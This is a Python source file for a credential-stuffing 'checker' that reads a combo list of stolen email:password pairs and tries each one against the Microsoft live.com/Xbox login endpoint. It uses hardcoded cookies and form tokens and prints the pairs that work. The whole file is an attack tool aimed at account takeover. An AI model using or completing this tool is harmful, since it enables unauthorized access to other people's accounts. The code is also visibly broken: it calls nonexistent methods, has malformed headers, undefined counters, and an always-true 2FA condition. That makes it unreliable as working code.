import requests
from time import gmtime, strftime, time
from colorama import Fore
from console import utils
from tkinter import filedialog
import os

logo = Fore.GREEN+'''
  ____  _         __  __ _                           __ _      ____ _               _             
 |  _ \| | __ _  |  \/  (_) ___ _ __ ___  ___  ___  / _| |_   / ___| |__   ___  ___| | _____ _ __ 
 | |_) | |/ _` | | |\/| | |/ __| '__/ _ \/ __|/ _ \| |_| __| | |   | '_ \ / _ \/ __| |/ / _ \ '__|
 |  __/| | (_| | | |  | | | (__| | | (_) \__ \ (_) |  _| |_  | |___| | | |  __/ (__|   <  __/ |   
 |_|   |_|\__, | |_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|  \____|_| |_|\___|\___|_|\_\___|_|   
             |_|                                                                                  \n'''

loginUrl = "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0" 

combo = []
proxylist = []
emails = []
passwords = []
hits,bad,twofa,cpm,errors,retries,checked = 0,0,0,0,0,0,0


def loginPost(email, password):
    payloadLogin = {
        f"i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099" 
    }

    headerLogin = {
        "Content-Type": "application/x-www-form-urlencoded" 
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
        "Pragma: no-cache" 
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
        "Upgrade-Insecure-Requests: 1" 
        "Referer: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1" 
        "Cookie: wlidperf=FR=L&ST=1573475967016; MSPShared=1; SDIDC=CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$; IgnoreCAW=1; MSCC=1571654982; mkt=en-US; optimizelyEndUserId=oeu1572238927711r0.5850160263416339; uaid=e94a49f177664960a3fca122edaf8a27; MSPRequ=id=292543&lt=1573475927&co=1; OParams=11DUe2VlF3OgbQNYrRZRg3REn8KImGd*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh; MSPOK=$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043" 
    }

    loginRequest = requests.POST(loginUrl, data=payloadLogin, headers=headerLogin, allow_redirects=True, timeout=10)

    #FAILURE PARSE

    if ",AC:null,urlFedConvertRename" in loginRequest.source or "incorrect account or password.\"," in loginRequest.source or ",AC:null,urlFedConvertRename" in loginRequest.source or "timed out" in loginRequest.source:
        bad += 1
    
    #2FA PARSE

    if "account.live.com/recover?mkt" or "recover?mkt" or "account.live.com/identity/confirm?mkt" or "',CW:true" or "https://account.live.com/profile/accrue?mkt=" or "Email/Confirm?mkt" or "/cancel?mkt=" or "/Abuse?mkt=" in loginRequest.source:
        twofa += 1

    #SUCCESS PARSE

    if "PPAuth" in loginRequest.cookies or "WLSSC" in loginRequest.cookies or "name=\"ANON\"" in loginRequest.source or "sSigninName" in loginRequest.source:
        hit += 1
        print(Fore.GREEN+f"{email}:{password}")
    


#Got Load function from https://github.com/MachineKillin/MSMC/blob/main/MSMC.py

def Load():
    global ComboName
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    ComboName = os.path.basename(filename.name)
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        Load()
    else:
        try:
            with open(filename.name, 'r+') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        Dump = line.replace('\n', '')
                        combo.append(Dump)
                    except: pass
            Dumped =  list(dict.fromkeys(combo))
            RemovedLines = len(combo) - len(Dumped)
            print(Fore.LIGHTBLUE_EX+f"[{RemovedLines}] Dupes Removed.")
            for lines in combo:
                try:
                    email = lines.split(":")[0].replace('\n', '')
                    password = lines.split(":")[1].replace('\n', '')
                    if email == "" or password == "": pass
                    emails.append(email)
                    passwords.append(password)
                except: pass
            print(Fore.LIGHTBLUE_EX+f"[{len(emails)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            Load()

def Main():
    Load()

